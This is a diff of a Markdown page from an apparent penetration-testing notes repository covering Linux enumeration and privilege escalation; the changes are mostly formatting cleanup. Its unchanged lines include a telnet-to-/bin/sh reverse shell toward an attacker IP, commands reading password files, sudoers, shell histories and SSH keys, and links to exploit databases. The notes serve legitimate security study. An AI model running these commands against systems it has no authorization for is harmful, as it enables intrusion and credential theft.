@@ -3,12 +3,13 @@
 {% hint style="success" %}
 Hack Responsibly.
 
-Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
+Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
 {% endhint %}
 
-TODO: (issue [#13](https://github.com/zweilosec/Infosec-Notes/issues/13))
-* Integrate "[Questions to Ask](#questions-to-ask)" into existing sections
-* Add descriptions (Keep/expand questions? Or rewrite?)
+TODO: \(issue [\#13](https://github.com/zweilosec/Infosec-Notes/issues/13)\)
+
+* Integrate "[Questions to Ask](enumeration.md#questions-to-ask)" into existing sections
+* Add descriptions \(Keep/expand questions? Or rewrite?\)
 * Clean up
 * Prep code examples for scripting
 * Split debian/redhat/BSD commands into "tabs"
@@ -148,9 +149,7 @@ Unix hardening tool that can be used for enumeration: [Bastille](http://bastille
 
 ## Questions to ask:
 
-
-
-TODO: Split debian/redhat/BSD commands up into tabs; Clean up code for scripting \($var, etc\) (issue [#13](https://github.com/zweilosec/Infosec-Notes/issues/13))
+TODO: Split debian/redhat/BSD commands up into tabs; Clean up code for scripting \($var, etc\) \(issue [\#13](https://github.com/zweilosec/Infosec-Notes/issues/13)\)
 
 ### Operating System
 
@@ -189,7 +188,6 @@ set
 Is there a printer?
 
 ```text
-
 lpstat -a
 ```
 
@@ -219,7 +217,7 @@ ls -alh /sbin/
 dpkg -l
 rpm -qa
 ls -alh /var/cache/apt/archivesO
-ls -alh /var/cache/yum/ 
+ls -alh /var/cache/yum/
 ```
 
 Any of the service\(s\) settings misconfigured? Are any \(vulnerable\) plugins attached?
@@ -234,7 +232,7 @@ cat /etc/apache2/apache2.conf
 cat /etc/my.conf
 cat /etc/httpd/conf/httpd.conf
 cat /opt/lampp/etc/httpd.conf
-ls -aRl /etc/ | awk '$1 ~ /^.*r.*/ 
+ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
 ```
 
 What jobs are scheduled?
@@ -260,7 +258,7 @@ Any plain text usernames and/or passwords?
 grep -i user [filename]
 grep -i pass [filename]
 grep -C 5 "password" [filename]
-find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla 
+find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
 ```
 
 ### Communications & Networking
@@ -322,7 +320,6 @@ Have you got a shell? Can you interact with the system?
 nc -lvp 4444    # Attacker. Input (Commands)
 nc -lvp 4445    # Attacker. Ouput (Results)
 telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
-
 ```
 
 Is port forwarding possible? Redirect and interact with traffic from another view
@@ -372,10 +369,10 @@ cat /etc/passwd | cut -d:    # List of users
 grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
 awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
 cat /etc/sudoers
-sudo -l 
+sudo -l
 ```
 
-What sensitive files can be read? 
+What sensitive files can be read?
 
 ```text
 cat /etc/passwd
@@ -414,7 +411,7 @@ cat ~/.mysql_history
 cat ~/.php_history
 ```
 
-What user information can be found? 
+What user information can be found?
 
 ```bash
 cat ~/.bashrc
@@ -425,7 +422,7 @@ cat /var/mail/root
 cat /var/spool/mail/root
 ```
 
-Can private-key information be found? 
+Can private-key information be found?
 
 ```text
 ls -la ~/.ssh
@@ -459,10 +456,10 @@ ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
 ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other
 
 find /etc/ -readable -type f 2>/dev/null                         # Anyone
-find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone 
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
 ```
 
-What can be found in `/var` ? 
+What can be found in `/var` ?
 
 ```text
 ls -alh /var/log
@@ -474,7 +471,7 @@ ls -alh /var/lib/mysql
 cat /var/lib/dhcp3/dhclient.leases
 ```
 
-Any settings/files  related to web server? Any settings file with database information?
+Any settings/files related to web server? Any settings file with database information?
 
 ```text
 ls -alhR /var/www/
@@ -538,7 +535,7 @@ echo os.system('/bin/bash')
 /bin/sh -i
 ```
 
-How are file-systems mounted? 
+How are file-systems mounted?
 
 ```text
 mount
@@ -562,7 +559,7 @@ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
 for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
 
 # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
-find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null 
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
 ```
 
 Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
@@ -602,25 +599,25 @@ find / -name curl
 find / -name nc*
 find / -name netcat*
 find / -name tftp* 
-find / -name ftp 
+find / -name ftp
 ```
 
 #### Researching Vulnerabilities
 
-* http://www.cvedetails.com
-* http://packetstormsecurity.org/files/cve/\[CVE\]
-* http://cve.mitre.org/cgi-bin/cvename.cgi?name=\[CVE\]
-* http://www.vulnview.com/cve-details.php?cvename=\[CVE\]
+* [http://www.cvedetails.com](http://www.cvedetails.com)
+* [http://packetstormsecurity.org/files/cve/\[CVE\](http://packetstormsecurity.org/files/cve/[CVE\)\]
+* [http://cve.mitre.org/cgi-bin/cvename.cgi?name=\[CVE\](http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE\)\]
+* [http://www.vulnview.com/cve-details.php?cvename=\[CVE\](http://www.vulnview.com/cve-details.php?cvename=[CVE\)\]
 
 #### Finding exploit code
 
-* https://www.exploit-db.com
-* https://cvebase.com
-* https://1337day.com
-* https://www.securiteam.com
-* https://www.securityfocus.com
-* https://www.exploitsearch.net
-* https://metasploit.com/modules/
-* https://securityreason.com
-* https://seclists.org/fulldisclosure/
+* [https://www.exploit-db.com](https://www.exploit-db.com)
+* [https://cvebase.com](https://cvebase.com)
+* [https://1337day.com](https://1337day.com)
+* [https://www.securiteam.com](https://www.securiteam.com)
+* [https://www.securityfocus.com](https://www.securityfocus.com)
+* [https://www.exploitsearch.net](https://www.exploitsearch.net)
+* [https://metasploit.com/modules/](https://metasploit.com/modules/)
+* [https://securityreason.com](https://securityreason.com)
+* [https://seclists.org/fulldisclosure/](https://seclists.org/fulldisclosure/)
 
